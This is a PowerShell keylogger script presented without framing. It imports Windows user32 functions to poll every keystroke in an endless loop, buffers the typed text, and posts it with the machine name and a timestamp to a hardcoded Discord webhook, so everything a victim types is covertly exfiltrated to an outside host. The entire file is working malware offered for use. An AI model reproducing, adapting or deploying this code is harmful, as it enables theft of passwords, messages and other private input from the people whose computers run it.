# Set the Discord Webhook URL
$dc = 'https://discord.com/api/webhooks/1311695277052399687/HJC824WaKk8WRTl-aYNOYUfTfwcPPc0EZlb8jRAc8pZ3vPOGRiDQgqMptAavOaboyD8M'

# Import necessary DLLs for keylogging
Add-Type -TypeDefinition @"
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")] public static extern int MapVirtualKey(int uCode, int uMapType);
[DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] lpKeyState);
[DllImport("user32.dll")] public static extern int ToUnicode(
    uint wVirtKey, uint wScanCode, byte[] lpKeyState, 
    System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@ -Name 'Win32' -Namespace 'Native'

# Initialize variables
$LastKeyPressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)
$sendBuffer = ""

# Loop indefinitely to monitor key presses
while ($true) {
    $keyPressed = $false
    for ($i = 8; $i -le 254; $i++) {
        if ([Native.Win32]::GetAsyncKeyState($i) -eq -32767) {
            $keyPressed = $true
            $LastKeyPressTime.Restart()
            $virtualKey = [Native.Win32]::MapVirtualKey($i, 0)
            $keyState = New-Object byte[] 256
            [Native.Win32]::GetKeyboardState($keyState)
            $charBuffer = New-Object System.Text.StringBuilder 2
            [Native.Win32]::ToUnicode($i, $virtualKey, $keyState, $charBuffer, $charBuffer.Capacity, 0)
            $character = $charBuffer.ToString()
            switch ($i) {
                8 { $character = "[BKSP]" }
                13 { $character = "[ENTER]" }
                27 { $character = "[ESC]" }
            }
            $sendBuffer += $character
        }
    }

    # If inactive for more than 10 seconds, send data
    if ($keyPressed -or $LastKeyPressTime.Elapsed -ge $KeypressThreshold) {
        if ($sendBuffer.Length -gt 0) {
            $timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            $message = @{
                username = $env:COMPUTERNAME
                content = "`[$timestamp]`: $sendBuffer"
            } | ConvertTo-Json -Depth 10
            Invoke-RestMethod -Uri $dc -Method POST -ContentType 'application/json' -Body $message
            $sendBuffer = ""
        }
        Start-Sleep -Milliseconds 500
    }
}
